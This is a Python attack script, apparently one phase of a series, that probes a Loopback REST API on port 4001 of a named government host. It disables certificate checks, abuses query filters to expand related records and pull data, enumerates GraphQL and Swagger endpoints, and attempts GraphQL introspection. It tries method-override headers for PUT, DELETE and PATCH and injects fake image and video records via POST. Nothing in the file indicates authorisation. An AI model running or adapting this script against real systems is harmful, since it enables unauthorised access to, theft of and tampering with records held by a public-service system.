#!/usr/bin/env python3
"""Phase 7: :4001 Loopback REST 深度注入测试
1. filter[include] 关系展开（关联模型）
2. filter[fields][field]=true 字段选择
3. filter[where][field] 复杂过滤（and/or/nested）
4. /graphql + /json-rpc 替代协议探测
5. HTTP 方法覆盖（X-HTTP-Method-Override）
6. POST Content-Type 探测
"""
import http.client, ssl, json, time
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=20, proto='https'):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout) if proto=='https' else http.client.HTTPConnection(host, port, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

# 1. /imageData filter[include] 关系展开测试
print("="*80)
print("Phase 7-1: /imageData filter[include] 关系展开")
print("="*80)
includes = [
    'ImageType',
    'Record',
    'CaseRecord',
    'ImageType,Record',
    'ImageType&filter[include]=Record',
    'related_models',
    '*',
]
for inc in includes:
    s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', f'/imageData?limit=2&filter[include]={inc}', timeout=15)
    if s == 200:
        try:
            arr = json.loads(b)
            if arr:
                first = arr[0]
                keys = list(first.keys())
                print(f"  filter[include]={inc:30s} → status=200  records={len(arr)}  keys={keys}")
                # 检查是否包含额外的关联字段
                if any(k not in ['id','recordUuid','CaseID','fileName','fileId','mimeType','generatedAt','createdAt','updatedAt','ImageTypeId','ImageType'] for k in keys):
                    print(f"    !! 额外字段: {[k for k in keys if k not in ['id','recordUuid','CaseID','fileName','fileId','mimeType','generatedAt','createdAt','updatedAt','ImageTypeId','ImageType']]}")
        except:
            print(f"  filter[include]={inc:30s} → JSON parse error")
    else:
        print(f"  filter[include]={inc:30s} → status={s}")

# 2. filter[fields] 字段选择
print()
print("="*80)
print("Phase 7-2: /imageData filter[fields] 字段选择")
print("="*80)
s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/imageData?limit=2&filter[fields][id]=true&filter[fields][recordUuid]=true', timeout=15)
print(f"  filter[fields][id]+[recordUuid] → status={s}  body[:500]={b[:500]!r}")
s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', '/imageData?limit=2&filter[fields][recordUuid]=true&filter[fields][fileName]=true', timeout=15)
print(f"  filter[fields][recordUuid]+[fileName] → status={s}  body[:500]={b[:500]!r}")

# 3. filter[where] 复杂条件
print()
print("="*80)
print("Phase 7-3: /imageData filter[where] 复杂条件")
print("="*80)
where_payloads = [
    '[recordUuid]=test1808113701',
    '[recordUuid][like]=test%',
    '[recordUuid][inq][]=test1808113701&filter[where][recordUuid][inq][]=Test201808271405',
    '[ImageTypeId]=1',
    '[ImageTypeId][gt]=0',
    '[and][][recordUuid]=test1808113701&filter[where][and][][ImageTypeId]=1',
    '[or][][ImageTypeId]=1&filter[where][or][][ImageTypeId]=2',
]
for payload in where_payloads:
    s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', f'/imageData?limit=5&filter[where]{payload}', timeout=15)
    try:
        arr = json.loads(b)
        print(f"  filter[where]{payload[:60]:60s} → status={s}  records={len(arr) if isinstance(arr,list) else 'N/A'}")
        if isinstance(arr, list) and arr:
            print(f"    sample: id={arr[0].get('id')} recordUuid={arr[0].get('recordUuid','')[:30]} ImageTypeId={arr[0].get('ImageTypeId')}")
    except:
        print(f"  filter[where]{payload[:60]:60s} → status={s}  body[:200]={b[:200]!r}")

# 4. 替代协议探测（GraphQL / JSON-RPC / WebSocket）
print()
print("="*80)
print("Phase 7-4: 替代协议探测")
print("="*80)
alt_paths = [
    '/graphql',
    '/graphiql',
    '/json-rpc',
    '/rpc',
    '/api/graphql',
    '/api/rpc',
    '/gql',
    '/v1/graphql',
    '/v2/graphql',
    '/swagger',
    '/openapi',
    '/openapi.json',
    '/swagger.json',
    '/api-docs',
    '/api/swagger.json',
]
for path in alt_paths:
    try:
        s, b, _ = req('epcr.tpf.gov.tw', 4001, 'GET', path, timeout=10)
        print(f"  GET {path:30s} → status={s}  size={len(b)}  body[:80]={b[:80]!r}")
    except Exception as e:
        print(f"  GET {path:30s} → ERROR {type(e).__name__}")

# 5. GraphQL introspection POST
print()
print("="*80)
print("Phase 7-5: GraphQL POST introspection")
print("="*80)
introspection = {"query": "{ __schema { types { name } } }"}
import urllib.request
data = json.dumps(introspection).encode('utf-8')
h = {'Content-Type': 'application/json'}
for path in ['/graphql', '/api/graphql', '/gql', '/']:
    try:
        cn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, context=ctx, timeout=15)
        cn.request('POST', path, body=data, headers=h)
        r = cn.getresponse()
        rb = r.read()
        cn.close()
        print(f"  POST {path:30s} → status={r.status}  size={len(rb)}  body[:100]={rb[:100]!r}")
    except Exception as e:
        print(f"  POST {path:30s} → ERROR {type(e).__name__}")

# 6. HTTP 方法覆盖（X-HTTP-Method-Override）
print()
print("="*80)
print("Phase 7-6: HTTP 方法覆盖（X-HTTP-Method-Override / X-HTTP-Method）")
print("="*80)
for fake_method in ['PUT', 'DELETE', 'PATCH']:
    for header_name in ['X-HTTP-Method-Override', 'X-HTTP-Method', 'X-Method-Override']:
        h = {header_name: fake_method}
        s, b, _ = req('epcr.tpf.gov.tw', 4001, 'POST', '/imageData?limit=2', body='{"recordUuid":"test"}', headers=h, timeout=15)
        print(f"  POST /imageData?limit=2  + {header_name}: {fake_method} → status={s}  size={len(b)}  body[:100]={b[:100]!r}")

# 7. POST 不同 Content-Type 探测
print()
print("="*80)
print("Phase 7-7: POST /imageData 不同 Content-Type")
print("="*80)
content_types = [
    'application/json',
    'application/x-www-form-urlencoded',
    'multipart/form-data',
    'text/plain',
    'application/xml',
    'application/graphql',
]
body = '{"recordUuid":"test","fileName":"test.png","fileId":99999,"mimeType":"image/png","ImageTypeId":1}'
for ct in content_types:
    h = {'Content-Type': ct}
    s, b, _ = req('epcr.tpf.gov.tw', 4001, 'POST', '/imageData', body=body, headers=h, timeout=15)
    print(f"  POST /imageData (Content-Type: {ct:30s}) → status={s}  body[:200]={b[:200]!r}")

# 8. /videoData 同样 POST
print()
print("="*80)
print("Phase 7-8: POST /videoData 不同 Content-Type")
print("="*80)
body = '{"recordUuid":"test","fileName":"test.mp4","fileId":99999,"mimeType":"video/mp4","VideoTypeId":1}'
for ct in content_types:
    h = {'Content-Type': ct}
    s, b, _ = req('epcr.tpf.gov.tw', 4001, 'POST', '/videoData', body=body, headers=h, timeout=15)
    print(f"  POST /videoData (Content-Type: {ct:30s}) → status={s}  body[:200]={b[:200]!r}")

# 9. content-range 头探测（验证分页机制）
print()
print("="*80)
print("Phase 7-9: /imageData Content-Range 头探测")
print("="*80)
s, b, h = req('epcr.tpf.gov.tw', 4001, 'GET', '/imageData?limit=2', timeout=15)
cr = h.get('content-range', 'N/A')
print(f"  /imageData?limit=2 → status={s}  Content-Range: {cr}")
s, b, h = req('epcr.tpf.gov.tw', 4001, 'GET', '/imageData?limit=2&offset=500000', timeout=15)
cr = h.get('content-range', 'N/A')
print(f"  /imageData?limit=2&offset=500000 → status={s}  Content-Range: {cr}")

# 10. /videoData Content-Range
s, b, h = req('epcr.tpf.gov.tw', 4001, 'GET', '/videoData?limit=2', timeout=15)
cr = h.get('content-range', 'N/A')
print(f"  /videoData?limit=2 → status={s}  Content-Range: {cr}")

